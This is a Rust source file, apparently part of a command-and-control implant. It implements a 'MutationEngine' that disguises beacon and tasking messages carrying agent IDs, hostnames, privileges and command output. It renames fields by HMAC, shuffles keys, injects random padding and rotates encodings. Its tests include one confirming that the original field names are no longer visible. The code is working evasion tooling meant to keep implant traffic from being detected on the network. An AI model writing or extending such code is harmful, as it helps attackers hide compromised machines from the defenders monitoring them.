use hmac::{Hmac, Mac};
use rand::Rng;
use serde_json::{Map, Value};
use sha2::Sha256;
use log::debug;

type HmacSha256 = Hmac<Sha256>;

const ENCODING_BASE64: u8 = 0;
const ENCODING_HEX: u8 = 1;
const ENCODING_BASE64URL: u8 = 2;
const ENCODING_BASE64_NOPAD: u8 = 3;

pub struct MutationEngine {
    seed: [u8; 32],
    mutation_index: u64,
}

impl MutationEngine {
    pub fn new(seed: &[u8; 32]) -> Self {
        Self {
            seed: *seed,
            mutation_index: 0,
        }
    }

    pub fn update_seed(&mut self, new_seed: &[u8; 32]) {
        self.seed = *new_seed;
        self.mutation_index = 0;
    }

    pub fn mutate(&mut self, json_bytes: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let original: Value = serde_json::from_slice(json_bytes)?;

        let field_map = self.derive_field_map();

        let mutated = self.obfuscate_value(&original, &field_map);

        let mutated = self.inject_padding(mutated);

        let json_out = serde_json::to_vec(&mutated)?;

        let encoding = self.pick_encoding();
        let encoded = self.encode_with_method(encoding, &json_out);

        // Wire format: [encoding_byte] [encoded_data]
        let mut result = Vec::with_capacity(1 + encoded.len());
        result.push(encoding);
        result.extend_from_slice(&encoded);

        self.mutation_index += 1;
        debug!("Payload mutated (index: {}, encoding: {}, size: {} -> {} bytes)",
            self.mutation_index, encoding, json_bytes.len(), result.len());

        Ok(result)
    }

    pub fn demutate(&mut self, data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        if data.is_empty() {
            return Err("Empty mutated payload".into());
        }

        let encoding = data[0];
        let encoded = &data[1..];

        let json_bytes = self.decode_with_method(encoding, encoded)?;

        let mutated: Value = serde_json::from_slice(&json_bytes)?;

        let field_map = self.derive_field_map();
        let reverse_map: std::collections::HashMap<String, String> = field_map
            .iter()
            .map(|(k, v)| (v.clone(), k.clone()))
            .collect();

        let restored = self.deobfuscate_value(&mutated, &reverse_map);

        let restored = self.strip_padding(restored);

        let result = serde_json::to_vec(&restored)?;

        self.mutation_index += 1;

        Ok(result)
    }

    fn derive_field_map(&self) -> std::collections::HashMap<String, String> {
        let known_fields = [
            "msg_type", "timestamp", "sequence", "payload",
            "agent_id", "hostname", "os", "os_version",
            "architecture", "ip_address", "user", "privileges",
            "command_id", "status", "output", "error",
            "execution_time", "v", "idx", "data",
        ];

        let mut map = std::collections::HashMap::new();
        for (i, field) in known_fields.iter().enumerate() {
            let obfuscated = self.derive_field_name(i as u32);
            map.insert(field.to_string(), obfuscated);
        }
        map
    }

    fn derive_field_name(&self, field_index: u32) -> String {
        let mut mac = <HmacSha256 as Mac>::new_from_slice(&self.seed)
            .expect("HMAC accepts any key size");
        mac.update(&self.mutation_index.to_be_bytes());
        mac.update(&field_index.to_be_bytes());
        mac.update(b"field-name-mutation");
        let result = mac.finalize().into_bytes();

        // 3-4 char alphanumeric name from hash
        let len = 3 + (result[0] % 2) as usize;
        let charset = b"abcdefghijklmnopqrstuvwxyz0123456789";
        let mut name = String::with_capacity(len);
        for i in 0..len {
            let idx = result[i + 1] as usize % charset.len();
            name.push(charset[idx] as char);
        }
        name
    }

    fn obfuscate_value(
        &self,
        value: &Value,
        field_map: &std::collections::HashMap<String, String>,
    ) -> Value {
        match value {
            Value::Object(obj) => {
                let mut new_obj = Map::new();
                // Collect entries and shuffle via deterministic permutation
                let mut entries: Vec<(String, Value)> = obj
                    .iter()
                    .map(|(k, v)| {
                        let new_key = field_map.get(k).cloned().unwrap_or_else(|| k.clone());
                        let new_val = self.obfuscate_value(v, field_map);
                        (new_key, new_val)
                    })
                    .collect();

                self.shuffle_entries(&mut entries);

                for (k, v) in entries {
                    new_obj.insert(k, v);
                }
                Value::Object(new_obj)
            }
            Value::Array(arr) => {
                Value::Array(arr.iter().map(|v| self.obfuscate_value(v, field_map)).collect())
            }
            other => other.clone(),
        }
    }

    fn deobfuscate_value(
        &self,
        value: &Value,
        reverse_map: &std::collections::HashMap<String, String>,
    ) -> Value {
        match value {
            Value::Object(obj) => {
                let mut new_obj = Map::new();
                for (k, v) in obj {
                    let original_key = reverse_map.get(k).cloned().unwrap_or_else(|| k.clone());
                    let restored_val = self.deobfuscate_value(v, reverse_map);
                    new_obj.insert(original_key, restored_val);
                }
                Value::Object(new_obj)
            }
            Value::Array(arr) => {
                Value::Array(arr.iter().map(|v| self.deobfuscate_value(v, reverse_map)).collect())
            }
            other => other.clone(),
        }
    }

    fn shuffle_entries(&self, entries: &mut [(String, Value)]) {
        if entries.len() <= 1 {
            return;
        }
        let mut mac = <HmacSha256 as Mac>::new_from_slice(&self.seed)
            .expect("HMAC accepts any key size");
        mac.update(&self.mutation_index.to_be_bytes());
        mac.update(b"shuffle-order");
        let hash = mac.finalize().into_bytes();

        // Fisher-Yates shuffle using hash bytes as entropy
        let len = entries.len();
        for i in (1..len).rev() {
            let byte_idx = (len - 1 - i) % 32;
            let j = hash[byte_idx] as usize % (i + 1);
            entries.swap(i, j);
        }
    }

    fn inject_padding(&self, mut value: Value) -> Value {
        if let Value::Object(ref mut obj) = value {
            let mut rng = rand::thread_rng();
            let pad_count = rng.gen_range(1..=4);

            for p in 0..pad_count {
                let pad_name = self.derive_padding_name(p);
                let pad_value = self.generate_padding_value(&mut rng);
                obj.insert(pad_name, pad_value);
            }
        }
        value
    }

    fn strip_padding(&self, mut value: Value) -> Value {
        if let Value::Object(ref mut obj) = value {
            let padding_names: Vec<String> = (0..8)
                .map(|p| self.derive_padding_name(p))
                .collect();
            for name in &padding_names {
                obj.remove(name);
            }
        }
        value
    }

    fn derive_padding_name(&self, pad_index: u32) -> String {
        let mut mac = <HmacSha256 as Mac>::new_from_slice(&self.seed)
            .expect("HMAC accepts any key size");
        mac.update(&self.mutation_index.to_be_bytes());
        mac.update(&pad_index.to_be_bytes());
        mac.update(b"padding-field");
        let result = mac.finalize().into_bytes();

        let charset = b"_abcdefghijklmnopqrstuvwxyz";
        let len = 4 + (result[0] % 3) as usize;
        let mut name = String::with_capacity(len);
        name.push('_');
        for i in 0..len {
            let idx = result[i + 1] as usize % charset.len();
            name.push(charset[idx] as char);
        }
        name
    }

    fn generate_padding_value(&self, rng: &mut impl Rng) -> Value {
        match rng.gen_range(0..3) {
            0 => {
                let len = rng.gen_range(4..32);
                let s: String = (0..len)
                    .map(|_| rng.gen_range(b'a'..=b'z') as char)
                    .collect();
                Value::String(s)
            }
            1 => Value::Number(serde_json::Number::from(rng.gen_range(0..100000))),
            _ => Value::Bool(rng.gen()),
        }
    }

    fn pick_encoding(&self) -> u8 {
        let mut mac = <HmacSha256 as Mac>::new_from_slice(&self.seed)
            .expect("HMAC accepts any key size");
        mac.update(&self.mutation_index.to_be_bytes());
        mac.update(b"encoding-select");
        let hash = mac.finalize().into_bytes();
        hash[0] % 4
    }

    fn encode_with_method(&self, method: u8, data: &[u8]) -> Vec<u8> {
        use base64::engine::general_purpose::{STANDARD, STANDARD_NO_PAD, URL_SAFE};
        use base64::Engine as _;

        match method {
            ENCODING_BASE64 => STANDARD.encode(data).into_bytes(),
            ENCODING_HEX => hex::encode(data).into_bytes(),
            ENCODING_BASE64URL => URL_SAFE.encode(data).into_bytes(),
            ENCODING_BASE64_NOPAD => STANDARD_NO_PAD.encode(data).into_bytes(),
            _ => STANDARD.encode(data).into_bytes(),
        }
    }

    fn decode_with_method(&self, method: u8, data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        use base64::engine::general_purpose::{STANDARD, STANDARD_NO_PAD, URL_SAFE};
        use base64::Engine as _;

        let text = std::str::from_utf8(data)?;
        match method {
            ENCODING_BASE64 => Ok(STANDARD.decode(text)?),
            ENCODING_HEX => Ok(hex::decode(text)?),
            ENCODING_BASE64URL => Ok(URL_SAFE.decode(text)?),
            ENCODING_BASE64_NOPAD => Ok(STANDARD_NO_PAD.decode(text)?),
            _ => Err(format!("Unknown encoding method: {}", method).into()),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_mutate_demutate_roundtrip() {
        let seed = [42u8; 32];
        let mut encoder = MutationEngine::new(&seed);
        let mut decoder = MutationEngine::new(&seed);

        let original = serde_json::json!({
            "msg_type": "BEACON",
            "timestamp": 1700000000u64,
            "sequence": 1,
            "payload": "{\"agent_id\":\"abc\"}"
        });
        let original_bytes = serde_json::to_vec(&original).unwrap();

        let mutated = encoder.mutate(&original_bytes).unwrap();
        let restored_bytes = decoder.demutate(&mutated).unwrap();
        let restored: Value = serde_json::from_slice(&restored_bytes).unwrap();

        assert_eq!(original["msg_type"], restored["msg_type"]);
        assert_eq!(original["timestamp"], restored["timestamp"]);
        assert_eq!(original["sequence"], restored["sequence"]);
        assert_eq!(original["payload"], restored["payload"]);
    }

    #[test]
    fn test_field_names_change_each_mutation() {
        let seed = [42u8; 32];
        let mut engine = MutationEngine::new(&seed);

        let original = serde_json::json!({"msg_type": "BEACON", "timestamp": 123});
        let original_bytes = serde_json::to_vec(&original).unwrap();

        let m1 = engine.mutate(&original_bytes).unwrap();

        let mut engine2 = MutationEngine::new(&seed);
        engine2.mutation_index = 1;
        let m2 = engine2.mutate(&original_bytes).unwrap();

        // Different mutation index = different field names and encoding
        assert_ne!(m1, m2);
    }

    #[test]
    fn test_no_original_field_names_visible() {
        let seed = [42u8; 32];
        let mut engine = MutationEngine::new(&seed);

        let original = serde_json::json!({
            "agent_id": "secret-agent-123",
            "hostname": "my-secret-host",
            "os": "linux"
        });
        let original_bytes = serde_json::to_vec(&original).unwrap();

        let mutated = engine.mutate(&original_bytes).unwrap();
        let mutated_str = String::from_utf8_lossy(&mutated);

        // Encoding byte + encoded data - original field names must not appear
        // (they're inside encoded data, but the decoded JSON uses obfuscated names)
        // Decode to check the JSON level
        let mut decoder = MutationEngine::new(&seed);
        let encoding = mutated[0];
        let decoded_json = decoder.decode_with_method(encoding, &mutated[1..]).unwrap();
        let decoded_str = String::from_utf8_lossy(&decoded_json);

        assert!(!decoded_str.contains("agent_id"));
        assert!(!decoded_str.contains("hostname"));
    }

    #[test]
    fn test_padding_injected() {
        let seed = [42u8; 32];
        let mut engine = MutationEngine::new(&seed);

        let original = serde_json::json!({"msg_type": "TEST"});
        let original_bytes = serde_json::to_vec(&original).unwrap();

        let mutated = engine.mutate(&original_bytes).unwrap();

        let mut decoder_engine = MutationEngine::new(&seed);
        let decoded = decoder_engine.decode_with_method(mutated[0], &mutated[1..]).unwrap();
        let parsed: Value = serde_json::from_slice(&decoded).unwrap();

        // Original has 1 field, mutated should have more (1 obfuscated + 1-4 padding)
        let obj = parsed.as_object().unwrap();
        assert!(obj.len() > 1);
    }

    #[test]
    fn test_encoding_rotation() {
        let seed = [42u8; 32];
        let data = serde_json::json!({"test": "data"});
        let data_bytes = serde_json::to_vec(&data).unwrap();

        let mut encodings_seen = std::collections::HashSet::new();
        for i in 0..20 {
            let mut engine = MutationEngine::new(&seed);
            engine.mutation_index = i;
            let mutated = engine.mutate(&data_bytes).unwrap();
            encodings_seen.insert(mutated[0]);
        }

        // Should use more than one encoding across 20 mutations
        assert!(encodings_seen.len() > 1, "Expected multiple encodings, got {:?}", encodings_seen);
    }

    #[test]
    fn test_multiple_roundtrips() {
        let seed = [42u8; 32];
        let mut encoder = MutationEngine::new(&seed);
        let mut decoder = MutationEngine::new(&seed);

        for i in 0..5 {
            let original = serde_json::json!({
                "msg_type": "BEACON",
                "sequence": i,
                "timestamp": 1700000000u64 + i as u64,
                "payload": format!("data_{}", i)
            });
            let original_bytes = serde_json::to_vec(&original).unwrap();

            let mutated = encoder.mutate(&original_bytes).unwrap();
            let restored_bytes = decoder.demutate(&mutated).unwrap();
            let restored: Value = serde_json::from_slice(&restored_bytes).unwrap();

            assert_eq!(original["msg_type"], restored["msg_type"]);
            assert_eq!(original["payload"], restored["payload"]);
        }
    }
}
